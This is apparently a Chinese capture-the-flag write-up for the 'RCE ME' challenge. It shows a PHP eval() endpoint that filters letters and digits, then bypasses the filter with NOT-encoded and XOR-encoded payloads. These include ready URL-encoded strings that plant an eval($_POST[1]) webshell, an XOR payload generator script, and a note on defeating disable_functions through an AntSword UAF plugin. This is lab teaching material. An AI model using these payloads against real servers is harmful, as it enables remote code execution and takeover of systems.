# [极客大挑战 2019]RCE ME

## 知识点

`正则表达式绕过`

`异或绕过`

`取反绕过`

## 解题

题目直接给出了源码

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>

```

发现会过滤`大小写字母和数字`，可以使用`取反绕过`和`异或绕过`

### 1.取反绕过
```php
<?php
echo urlencode(~'phpinfo'); // %8F%97%8F%96%91%99%90
```

![alt text](<img/[极客大挑战 2019]RCE ME-1.png>)

然后尝试构造`assert(eval($_POST[1]))`

```php
<?php
echo urlencode(~'assert');  // %9E%8C%8C%9A%8D%8B

echo urlencode(~'eval($_POST[1])');     // %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6
```

![alt text](<img/[极客大挑战 2019]RCE ME-2.png>)

可以实现`RCE`，只是`disable_function`太多，用`蚁剑`连接后使用插件`绕过disable_function`，可以一个个试,我这里用的是`PHP7_Backtrace_UAF`

![alt text](<img/[极客大挑战 2019]RCE ME-3.png>)


### 2.异或绕过

生成异或内容的脚本
```php
<?php
function gen($pl) {
    $aa = "";
    $bb = "";
    for ($j = 0; $j < strlen($pl); $j++) {
        for ($i = 0xa0; $i < 0xff; $i++) {
            if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($i)) == 0) {
                $t = chr($i) ^ $pl[$j];
                if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $t) == 0) {
                    $aa .= chr($i);
                    $bb .= $t;
                    break;
                }
            }
        }
    }
    return str_replace("%", "\x", urlencode($aa) . "^" . urlencode($bb) . "\r\n");
}
function gen_url($pl) {
    $aa = "";
    $bb = "";
    for ($j = 0; $j < strlen($pl); $j++) {
        for ($i = 0xa0; $i < 0xff; $i++) {
            if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($i)) == 0) {
                $t = chr($i) ^ $pl[$j];
                if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $t) == 0) {
                    $aa .= chr($i);
                    $bb .= $t;
                    break;
                }
            }
        }
    }
    return urlencode($aa) . "^" . urlencode($bb). "\r\n";
}

echo gen("_GET");
echo gen_url("_GET");


echo "\n";
echo "\xA0\xA0\xA0\xA0"^"\xFF\xE7\xE5\xF4";
echo "\n";

echo "\n";
echo urldecode("%A0%A0%A0%A0")^urldecode("%FF%E7%E5%F4");
echo "\n";
```

![alt text](<img/[极客大挑战 2019]RCE ME-4.png>)

后续和上面相同即可